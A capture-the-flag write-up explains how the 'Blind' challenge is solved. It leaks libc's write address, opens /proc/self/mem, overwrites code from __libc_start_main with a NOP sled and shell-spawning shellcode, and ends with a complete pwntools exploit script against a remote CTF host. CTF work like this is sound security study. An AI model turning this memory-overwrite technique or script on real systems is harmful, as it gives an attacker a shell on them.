# Blind

> Looking at the title introduction, it should be something about BROP. Also found that there is no attachment.  
> I have never done a BROP problem before, so let's give it a try.  
> [CTF-WIKI_BROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#brop)

First, let's see what the program will do.

![image-20220217140202100](https://oss.nova.gal/img/image-20220217140202100.png)

You can see that the program first provides the address of `write`, but since we don't know the libc version, although we can find the libc version based on the lower 12 bits, we choose `LibcSearcher` for a quicker solution.

In this way, it is easy to find `libc_base`.

```python
sh.recvuntil(b"write: ")
write_addr = int(sh.recvuntil(b"\n", drop=True), 16)
success(">>> write_addr: {}".format(hex(write_addr)))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
success(">>> libc_base: {}".format(hex(libc_base)))
```

Next, it allows us to open a file.

![image-20220217140449422](https://oss.nova.gal/img/image-20220217140449422.png)

Introduction to some related contents of `/proc/`.

## /proc/

The Linux kernel provides a mechanism to access kernel data and change kernel settings during program execution through the /proc filesystem. /proc is a pseudo-file structure, which means it exists only in memory and not on external storage. Some important directories in /proc are sys, net, and scsi. The sys directory is writable and can be used to access and modify kernel parameters.

/proc also contains process directories named after PID (process ID), which can be used to read information about the corresponding processes. There is also a /self directory, used to record information specific to the current process.

### /proc/self/

This is like a symlink, where different PIDs accessing this directory essentially enter different /proc/$(PID)/ directories.

#### /proc/self/maps

This file is used to record the memory mapping of the current process, similar to the `vmmap` command in GDB. By reading this file, you can obtain the base address of the memory code segment.

#### /proc/self/mem

This file records information about the process memory. Modifying this file is equivalent to directly modifying the process memory. This file is readable and writable, but reading it directly will result in an error.

You need to modify `offset`'s `val` based on the mapping information in `/proc/self/maps`.

If we write some code to the `.text` section, the code at that address will become `disasm(val)`.

Therefore, it naturally comes to mind to write shellcode there. However, since we do not have the source file, we cannot be sure where the program has executed and thus cannot control the program to jump to the exact location where the `shellcode` starts.

## Shellcode Spray

At this point, if we change the address context to all `nop` and add a segment of `shellcode` at the end, whenever the program reaches any position where `nop` is located, the `shellcode` will execute normally.

Thus, we may as well change a large section starting from `__libc_start_main` to `nop`, ensuring that the program is definitely covered by `nop`.

Exp:

```python
import string

from pwn import *
from pwnlib.util.iters import mbruteforce
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = remote('chuj.top', 51812)

sh.recvuntil(b' == ')
hash_code = sh.recvuntil(b"\n", drop=True).decode('UTF-8')
charset = string.ascii_letters
# print(hash_code, type(hash_code))
proof = mbruteforce(lambda x: hashlib.sha256(x.encode()).hexdigest() ==
                              hash_code, charset, 4, method='fixed')

sh.sendlineafter(b"????> ", proof.encode())

sh.recvuntil(b"write: ")
write_addr = int(sh.recvuntil(b"\n", drop=True), 16)
success(">>> write_addr: {}".format(hex(write_addr)))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
success(">>> libc_base: {}".format(hex(libc_base)))

sh.sendlineafter(b">> ", b'/proc/self/mem\x00')

__libc_start_main_addr = libc_base + libc.dump('__libc_start_main')
success(">>> __libc_start_main: {}".format(hex(__libc_start_main_addr)))
sh.sendlineafter(b">> ", str(__libc_start_main_addr).encode())

payload = asm('nop') * 0x300 + asm(shellcraft.sh())
sh.sendlineafter(b">> ", payload)

sh.interactive()
```

<!-- AI -->
